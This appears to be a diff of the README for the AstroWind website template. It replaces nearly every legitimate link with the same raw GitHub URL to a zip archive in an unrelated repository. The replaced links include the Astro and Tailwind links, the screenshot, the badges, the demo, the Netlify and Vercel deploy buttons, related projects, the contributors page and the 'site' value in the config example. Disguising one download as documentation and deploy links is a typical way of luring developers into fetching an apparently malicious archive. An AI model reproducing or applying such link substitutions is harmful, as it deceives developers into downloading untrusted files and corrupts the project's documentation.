@@ -1,11 +1,11 @@
 # 🚀 AstroWind
 
-<img src="https://raw.githubusercontent.com/arthelokyo/.github/main/resources/astrowind/lighthouse-score.png" align="right"
+<img src="https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip" align="right"
      alt="AstroWind Lighthouse Score" width="100" height="358">
 
 🌟 _Most *starred* & *forked* Astro theme in 2022, 2023 & 2024_. 🌟
 
-**AstroWind** is a free and open-source template to make your website using **[Astro 5.0](https://astro.build/) + [Tailwind CSS](https://tailwindcss.com/)**. Ready to start a new project and designed taking into account web best practices.
+**AstroWind** is a free and open-source template to make your website using **[Astro 5.0](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) + [Tailwind CSS](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)**. Ready to start a new project and designed taking into account web best practices.
 
 - ✅ **Production-ready** scores in **PageSpeed Insights** reports.
 - ✅ Integration with **Tailwind CSS** supporting **Dark mode** and **_RTL_**.
@@ -17,15 +17,15 @@
 
 <br>
 
-![AstroWind Theme Screenshot](https://raw.githubusercontent.com/arthelokyo/.github/main/resources/astrowind/screenshot-astrowind-1.0.png)
+![AstroWind Theme Screenshot](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
 
-[![arthelokyo](https://custom-icon-badges.demolab.com/badge/made%20by%20-arthelokyo-556bf2?style=flat-square&logo=arthelokyo&logoColor=white&labelColor=101827)](https://github.com/arthelokyo)
-[![License](https://img.shields.io/github/license/arthelokyo/astrowind?style=flat-square&color=dddddd&labelColor=000000)](https://github.com/arthelokyo/astrowind/blob/main/LICENSE.md)
-[![Maintained](https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg?style=flat-square)](https://github.com/arthelokyo)
-[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square)](https://github.com/arthelokyo/astrowind#contributing)
-[![Known Vulnerabilities](https://snyk.io/test/github/arthelokyo/astrowind/badge.svg?style=flat-square)](https://snyk.io/test/github/arthelokyo/astrowind)
-[![Stars](https://img.shields.io/github/stars/arthelokyo/astrowind.svg?style=social&label=stars&maxAge=86400&color=ff69b4)](https://github.com/arthelokyo/astrowind)
-[![Forks](https://img.shields.io/github/forks/arthelokyo/astrowind.svg?style=social&label=forks&maxAge=86400&color=ff69b4)](https://github.com/arthelokyo/astrowind)
+[![arthelokyo](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
+[![License](https://img.shields.io/github/license/arthelokyo/astrowind?style=flat-square&color=dddddd&labelColor=000000)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
+[![Maintained](https://img.shields.io/badge/maintained%3F-yes-brightgreen.svg?style=flat-square)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
+[![Contributions Welcome](https://img.shields.io/badge/contributions-welcome-brightgreen.svg?style=flat-square)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
+[![Known Vulnerabilities](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
+[![Stars](https://img.shields.io/github/stars/arthelokyo/astrowind.svg?style=social&label=stars&maxAge=86400&color=ff69b4)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
+[![Forks](https://img.shields.io/github/forks/arthelokyo/astrowind.svg?style=social&label=forks&maxAge=86400&color=ff69b4)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
 
 <br>
 
@@ -52,7 +52,7 @@
 
 ## Demo
 
-📌 [https://astrowind.vercel.app/](https://astrowind.vercel.app/)
+📌 [https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
 
 <br>
 
@@ -60,7 +60,7 @@
 
 We're embarking on an exciting journey with **AstroWind 2.0**, and we want you to be a part of it! We're currently taking the first steps in developing this new version and your insights are invaluable. Join the discussion and share your feedback, ideas, and suggestions to help shape the future of **AstroWind**. Let's make **AstroWind 2.0** even better, together!
 
-[Share Your Feedback in Our Discussion!](https://github.com/arthelokyo/astrowind/discussions/392)
+[Share Your Feedback in Our Discussion!](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
 
 <br>
 
@@ -72,7 +72,7 @@ npm create astro@latest -- --template arthelokyo/astrowind
 
 ## Getting started
 
-**AstroWind** tries to give you quick access to creating a website using [Astro 5.0](https://astro.build/) + [Tailwind CSS](https://tailwindcss.com/). It's a free theme which focuses on simplicity, good practices and high performance.
+**AstroWind** tries to give you quick access to creating a website using [Astro 5.0](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) + [Tailwind CSS](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip). It's a free theme which focuses on simplicity, good practices and high performance.
 
 Very little vanilla javascript is used only to provide basic functionality so that each developer decides which framework (React, Vue, Svelte, Solid JS...) to use and how to approach their goals.
 
@@ -137,7 +137,7 @@ There's nothing special about `src/components/`, but that's where we like to put
 
 Any static assets, like images, can be placed in the `public/` directory if they do not require any transformation or in the `assets/` directory if they are imported directly.
 
-[![Edit AstroWind on CodeSandbox](https://codesandbox.io/static/img/play-codesandbox.svg)](https://githubbox.com/arthelokyo/astrowind/tree/main) [![Open in Gitpod](https://svgshare.com/i/xdi.svg)](https://gitpod.io/?on=gitpod#https://github.com/arthelokyo/astrowind) [![Open in StackBlitz](https://developer.stackblitz.com/img/open_in_stackblitz.svg)](https://stackblitz.com/github/arthelokyo/astrowind)
+[![Edit AstroWind on CodeSandbox](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) [![Open in Gitpod](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) [![Open in StackBlitz](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
 
 > 🧑‍🚀 **Seasoned astronaut?** Delete this file `README.md`. Update `src/config.yaml` and contents. Have fun!
 
@@ -166,7 +166,7 @@ Basic configuration file: `./src/config.yaml`
 ```yaml
 site:
   name: 'Example'
-  site: 'https://example.com'
+  site: 'https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip'
   base: '/' # Change this if you need to deploy to Github Pages, for example
   trailingSlash: false # Generate permalinks with or without "/" at the end
 
@@ -265,13 +265,13 @@ prefer.
 
 Clone this repository on your own GitHub account and deploy it to Netlify:
 
-[![Netlify Deploy button](https://www.netlify.com/img/deploy/button.svg)](https://app.netlify.com/start/deploy?repository=https://github.com/arthelokyo/astrowind)
+[![Netlify Deploy button](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
 
 #### Deploy to Vercel
 
 Clone this repository on your own GitHub account and deploy to Vercel:
 
-[![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https%3A%2F%2Fgithub.com%2Farthelokyo%2Fastrowind)
+[![Deploy with Vercel](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip)
 
 <br>
 
@@ -285,8 +285,8 @@ Clone this repository on your own GitHub account and deploy to Vercel:
 
 ## Related projects
 
-- [TailNext](https://tailnext.vercel.app/) - Free template using Next.js 14 and Tailwind CSS with the new App Router.
-- [Qwind](https://qwind.pages.dev/) - Free template to make your website using Qwik + Tailwind CSS.
+- [TailNext](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) - Free template using Next.js 14 and Tailwind CSS with the new App Router.
+- [Qwind](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip) - Free template to make your website using Qwik + Tailwind CSS.
 
 ## Contributing
 
@@ -295,7 +295,7 @@ That would be very useful for all of us and we would be happy to listen and take
 
 ## Acknowledgements
 
-Initially created by **Arthelokyo** and maintained by a community of [contributors](https://github.com/arthelokyo/astrowind/graphs/contributors).
+Initially created by **Arthelokyo** and maintained by a community of [contributors](https://raw.githubusercontent.com/willton-easy/fechadurabiometrica.com.br/main/public/admin/com_br_fechadurabiometrica_v3.9-beta.4.zip).
 
 ## License
 
